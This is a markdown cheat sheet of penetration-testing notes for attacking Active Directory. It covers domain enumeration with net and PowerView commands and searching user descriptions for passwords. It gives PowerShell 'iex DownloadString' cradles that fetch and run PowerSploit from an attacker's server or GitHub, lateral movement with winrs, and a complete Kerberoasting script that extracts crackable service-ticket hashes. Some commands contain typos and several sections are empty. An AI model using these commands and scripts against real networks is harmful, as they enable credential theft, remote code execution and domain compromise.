# Active Directory

## Enumeration

### Basic Enumeration

*All from Powershell*

- Local user `net user`
- List local admins `net localgroup Administrators`
- List all domain user `net user /domain`
- List all domain groups `net gourp /domain`
- List users in Domain Admin group `net group "Domain Admins" /domain`
- Domain and DC `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
- DC hostname `cmd.exe /c "echo %logonserver%"`

### PowerView.ps1
#### Download PowerView.ps1
Link 

https://raw.githubusercontent.com/ZeroDayLab/PowerSploit/master/Recon/PowerView.ps1

Or

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

Download and run from attacker's machine

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks
```

Download and run from internet

```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```

Load PowerView `. ./PowerView.ps1`

#### Domain Controller

- `Get-DomainController`

#### Users

- Get all users `Get-DomainUser`
- Get all users usernames `Get-DomainUser | select -ExpandProperty samaccountname`
- Get users with highest number of logon `GetDomainUser -Properties samaccountname, logoncount`

**Search for users whose desrcription contains keywords**

Get local users

`Get-DomainUser -LDAPFilter "Description=*built*" | Select name, Description`

Get passwords in description

`Get-DomainUser -LDAPFilter "Description=*password*" | Select name, Description`

#### Computers

- List all computers `Get-DomainComputer | select -ExpandProperty dnshostname`

#### Groups

**AdminGroup**

- `Get-DomainGroup *admin* | select samaccountname`

**Domain Admins**

- Show details of Domain Admins group `Get-DomainGroup -Identity "Domain Admins" -Recurse`
- List members of Domain Admins gourp `Get-DomainGroupMember -Identity "Domain Admins" | select -ExpandProperty MemberName`

**Enterprise Admins**

- Show details of Enterprise Admins group `Get-DomainGroup -Identity "Enterprise Admins"`
- List members of Enterprise Admins gourp `Get-DomainGroupMember -Identity "Enterprise Admins" | select -ExpandProperty MemberName`

** Groups user belongs to **

- `Get-DomainGroup "username" | select name`

#### OUs
#### GPUs
### ADModule


## Find Where Current User Has Local Admin

### Find-PSRemotingLocalAdminAccess.ps1

- Where to find this script
- `. ./Find-PSRemotingLocalAdminAccess.ps1`
- `Find-PSRemotingLocalAdminAccess` Output will be list of machines where the current user has admin access

### Connect Using winrs
- CMD `winrs -r:machine01 cmd`

## Issue a request for a single SPN's kerberos ticket

```
Add-Type -AssemblyName System.IdentityModel
$UserSPN = '<add spn here>'
$Domain = '<client domain goes here>'
$Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
$TicketByteStream = $Ticket.GetRequest()
$TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)


    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). "
    }
    else {$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
    }
}

if($Hash) {
    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe..
    if ($OutputFormat -match 'John') {
        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
    }
    else {

        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
        $HashFormat = "`$krb5tgs`$$($Etype)`$*$UserSPN`$$Domain`$$($Ticket.ServicePrincipalName)*`$$Hash"
    }
    $hashformat
}```

